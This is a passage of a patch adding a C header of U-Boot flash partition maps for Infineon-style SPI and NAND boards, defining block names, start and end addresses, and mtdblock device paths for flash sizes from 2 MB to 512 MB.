+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x003F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x003F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0x003F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0x003F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00020000\0"                                      \
+        "part2_begin=0x000A0000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "data_block7=" IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME "\0"    \
+        "total_db=8\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME         "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR         0x00020000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x000A0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007DFFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007E0000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007EFFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007F0000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007F0FFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007F1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x1000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007F1FFF
+  
+  #define IFX_CFG_FLASH_CALIBRATION_CFG_BLOCK_NAME	      "calibration"
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_START_ADDR	      0x007F2000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_SIZE		          0x1000
+	#define IFX_CFG_FLASH_CALIBRATION_CFG_END_ADDR		      0x007F2FFF  
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x007FFFFF
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#endif /*CONFIG_FIRMWARE_IN_ROOTFS*/
+
+
+#endif /*CONFIG_BOOT_FROM_SPI*/
+/* End of Board specific configurations
+ *-----------------------------------------------------------------------
+ */
+
+
+
+/***************************************************************************/
+/***************************************************************************/
+/***************NAND FLASH map starts here***********************************/
+/***************************************************************************/
+/***************************************************************************/
+
+#ifdef CONFIG_BOOT_FROM_NAND
+
+#ifdef CONFIG_NAND_FLASH_2M
+#define IFX_CONFIG_FLASH_SIZE 2
+#elif CONFIG_NAND_FLASH_4M
+#define IFX_CONFIG_FLASH_SIZE 4
+#elif CONFIG_NAND_FLASH_8M
+#define IFX_CONFIG_FLASH_SIZE 8
+#elif CONFIG_NAND_FLASH_128M
+#define IFX_CONFIG_FLASH_SIZE 128
+#elif CONFIG_NAND_FLASH_512M
+#define IFX_CONFIG_FLASH_SIZE 512
+#endif
+
+#ifndef IFX_CONFIG_FLASH_SIZE
+#define IFX_CONFIG_FLASH_SIZE 4
+#endif
+
+#ifdef CONFIG_FIRMWARE_IN_ROOTFS
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FB200
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+        
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF  
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x003FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                          0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00010000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007FF3FF
+
+ 
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 128)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00040000\0"                                      \
+        "part2_begin=0x002C0000\0"                                      \
+        "part3_begin=0x07000000\0"                                      \
+        "part4_begin=0x07040000\0"                                      \
+        "part5_begin=0x07080000\0"                                      \
+        "total_part=6\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0x0
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x002C0000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0x06D40000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x7000000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x40000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x0703FFFF
+  #define IFX_CFG_FLASH_SYSTEM_CFG_MTDBLOCK_NAME          "/dev/mtdblock3"
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x7040000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x10000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x0704FFFF
+  #define IFX_CFG_FLASH_UBOOT_CFG_MTDBLOCK_NAME           "/dev/mtdblock4"
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x07080000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x40000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x070BFFFF
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_MTDBLOCK_NAME       "/dev/mtdblock5"
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x07FFFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 512)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "total_part=2\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block2=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block4=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block5=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=6\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME            "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR            0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                  0x40000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME         "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME           "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR           0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x007EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x007EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x007FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x007FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x007FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x007FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x007FF3FF
+
+  #define IFX_CFG_FLASH_END_ADDR                         0x007FFFFF
+
+
+#else
+  #error "ERROR!! Define flash size first!"
+#endif
+
+#else /*Not defined CONFIG_FIRMWARE_IN_ROOTFS*/
+//2MB flash partition
+#if (IFX_CONFIG_FLASH_SIZE == 2)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO          \
+  "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"  \
+  "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0" \
+  "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0" \
+  "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0" \
+  "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"   \
+  "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"    \
+  "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"  \
+  "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME          "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR          0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME       "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR       0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE             0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME    "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME         "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR         0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE               0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME      "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME         "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR         0x001FADFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE               0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME           "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR           0x001FAE00
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                 0x4000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR             0x001FEDFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME            "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR            0x001FEE00
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                  0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR              0x001FFDFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME        "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR        0x001FFE00
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE              0x0200
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR          0x001FFFFF
+
+  #define IFX_CFG_FLASH_END_ADDR                        0x001FFFFF
+
+//4MB flash partition
+#elif (IFX_CONFIG_FLASH_SIZE == 4)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00040000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
+        "data_block4=" IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME "\0"         \
+        "data_block5=" IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME "\0"          \
+        "data_block6=" IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME "\0"      \
+        "total_db=7\0"
+
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME           "uboot"
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_START_ADDR           0x00000000
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_SIZE                 0
+  #define IFX_CFG_FLASH_UBOOT_IMAGE_MTDBLOCK_NAME        "/dev/mtdblock0"
+
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME        "firmware"
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_START_ADDR        0x00010000
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_SIZE              0
+  #define IFX_CFG_FLASH_FIRMWARE_IMAGE_MTDBLOCK_NAME     "/dev/mtdblock1"
+
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME          "rootfs"
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_START_ADDR          0x00040000
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_SIZE                0
+  #define IFX_CFG_FLASH_ROOTFS_IMAGE_MTDBLOCK_NAME       "/dev/mtdblock2"
+
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME           "kernel"
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_START_ADDR           0x003EDFFF
+  #define IFX_CFG_FLASH_KERNEL_IMAGE_SIZE                 0
+
+  #define IFX_CFG_FLASH_SYSTEM_CFG_BLOCK_NAME             "sysconfig"
+  #define IFX_CFG_FLASH_SYSTEM_CFG_START_ADDR             0x003EE000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_SIZE                   0x10000
+  #define IFX_CFG_FLASH_SYSTEM_CFG_END_ADDR               0x003FDFFF
+
+  #define IFX_CFG_FLASH_UBOOT_CFG_BLOCK_NAME              "ubootconfig"
+  #define IFX_CFG_FLASH_UBOOT_CFG_START_ADDR              0x003FE000
+  #define IFX_CFG_FLASH_UBOOT_CFG_SIZE                    0x1000
+  #define IFX_CFG_FLASH_UBOOT_CFG_END_ADDR                0x003FEFFF
+
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_BLOCK_NAME          "fwdiag"
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_START_ADDR          0x003FF000
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_SIZE                0x400
+  #define IFX_CFG_FLASH_FIRMWARE_DIAG_END_ADDR            0x003FF3FF
+  
+  #define IFX_CFG_FLASH_END_ADDR                         0x003FFFFF
+
+#elif (IFX_CONFIG_FLASH_SIZE == 8)
+#define IFX_CFG_FLASH_PARTITIONS_INFO                                   \
+        "part0_begin=0x00000000\0"                                      \
+        "part1_begin=0x00010000\0"                                      \
+        "part2_begin=0x00050000\0"                                      \
+        "total_part=3\0"
+
+#define IFX_CFG_FLASH_DATA_BLOCKS_INFO                                  \
+        "data_block0=" IFX_CFG_FLASH_UBOOT_IMAGE_BLOCK_NAME "\0"        \
+        "data_block1=" IFX_CFG_FLASH_FIRMWARE_IMAGE_BLOCK_NAME "\0"     \
+        "data_block2=" IFX_CFG_FLASH_ROOTFS_IMAGE_BLOCK_NAME "\0"       \
+        "data_block3=" IFX_CFG_FLASH_KERNEL_IMAGE_BLOCK_NAME "\0"       \
